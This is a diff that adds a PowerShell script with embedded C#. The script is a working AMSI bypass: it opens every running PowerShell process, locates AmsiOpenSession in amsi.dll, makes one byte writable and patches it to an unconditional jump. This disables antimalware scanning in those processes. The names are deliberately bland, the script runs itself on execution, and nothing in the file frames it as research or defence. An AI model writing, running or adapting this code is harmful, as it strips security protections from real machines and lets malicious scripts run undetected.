@@ -1,0 +1,96 @@
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+public class testmeplease
+{
+    public const int PROCESS_VM_OPERATION = 0x0008;
+    public const int PROCESS_VM_READ = 0x0010;
+    public const int PROCESS_VM_WRITE = 0x0020;
+    public const uint PAGE_EXECUTE_READWRITE = 0x40;
+    [DllImport("ntdll.dll")]
+    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, [In] ref OBJECT_ATTRIBUTES ObjectAttributes, [In] ref CLIENT_ID ClientId);
+    [DllImport("ntdll.dll")]
+    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
+    [DllImport("ntdll.dll")]
+    public static extern int NtClose(IntPtr Handle);
+   
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr LoadLibrary(string lpFileName);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    [StructLayout(LayoutKind.Sequential)]
+    public struct OBJECT_ATTRIBUTES
+    {
+        public int Length;
+        public IntPtr RootDirectory;
+        public IntPtr ObjectName;
+        public int Attributes;
+        public IntPtr SecurityDescriptor;
+        public IntPtr SecurityQualityOfService;
+    }
+    [StructLayout(LayoutKind.Sequential)]
+    public struct CLIENT_ID
+    {
+        public IntPtr UniqueProcess;
+        public IntPtr UniqueThread;
+    }
+}
+"@
+function testmeagainplease {
+    param (
+        [int]$processId
+    )
+    $patch = [byte]0xEB
+    $objectAttributes = New-Object testmeplease+OBJECT_ATTRIBUTES
+    $clientId = New-Object testmeplease+CLIENT_ID
+    $clientId.UniqueProcess = [IntPtr]$processId
+    $clientId.UniqueThread = [IntPtr]::Zero
+    $objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)
+    $hHandle = [IntPtr]::Zero
+    $status = [testmeplease]::NtOpenProcess([ref]$hHandle, [testmeplease]::PROCESS_VM_OPERATION -bor [testmeplease]::PROCESS_VM_READ -bor [testmeplease]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)
+    if ($status -ne 0) {
+        
+        return
+    }
+    $amsiHandle = [testmeplease]::LoadLibrary("amsi.dll")
+    if ($amsiHandle -eq [IntPtr]::Zero) {
+        [testmeplease]::NtClose($hHandle)
+        return
+    }
+    $amsiOpenSession = [testmeplease]::GetProcAddress($amsiHandle, "AmsiOpenSession")
+    if ($amsiOpenSession -eq [IntPtr]::Zero) {
+        [testmeplease]::NtClose($hHandle)
+        return
+    }
+    $patchAddr = [IntPtr]($amsiOpenSession.ToInt64() + 3)
+    $oldProtect = [UInt32]0
+    $size = [UIntPtr]::new(1)  # Correct conversion to UIntPtr
+    $protectStatus = [testmeplease]::VirtualProtectEx($hHandle, $patchAddr, $size, [testmeplease]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
+    if (-not $protectStatus) {
+        [testmeplease]::NtClose($hHandle)
+        return
+    }
+
+    $bytesWritten = [System.UInt32]0
+    $status = [testmeplease]::NtWriteVirtualMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)
+    if ($status -eq 0) {
+        Write-Host "Success" -ForegroundColor Green
+    } else {
+        Write-Host "Failed" -ForegroundColor Red
+    }
+    $restoreStatus = [testmeplease]::VirtualProtectEx($hHandle, $patchAddr, $size, $oldProtect, [ref]$oldProtect)
+    if (-not $restoreStatus) {
+        Write-Host "Failed" -ForegroundColor Red
+    }
+    [testmeplease]::NtClose($hHandle)
+}
+function ModAllPShells {
+    Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
+        testmeagainplease -processId $_.Id
+    }
+}
+ModAllPShells
+ 
